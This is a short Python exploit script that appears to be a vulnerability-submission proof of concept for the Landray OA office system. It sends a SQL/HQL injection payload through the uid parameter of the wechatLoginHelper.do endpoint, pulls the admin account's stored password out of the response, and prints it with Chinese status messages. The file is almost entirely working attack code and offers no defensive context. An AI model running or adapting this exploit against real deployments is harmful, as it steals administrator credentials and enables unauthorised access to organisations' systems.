#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

patt = "~(\w+)~"

def verify(site):
    burp0_url = site + "/third/wechat/wechatLoginHelper.do?method=edit&uid=1%27and+(SELECT+'~'%2BfdPassword%2B'~'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+%271%27=%271"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.850.132 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip", "Connection": "close"}
    try:
        r = requests.get(burp0_url, headers=burp0_headers, verify=False)
        if r.status_code == 200:
            password = re.search(patt,r.text,re.I).group()
            return password
    except:
        pass
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 landray-oa-wechatLoginHelper-sqli.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，查询 payload  SELECT+'~'%2BfdPassword%2B'~'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin'  获取管理园密码的结果为：", info)
    else:
        print("[-]漏洞不存在")
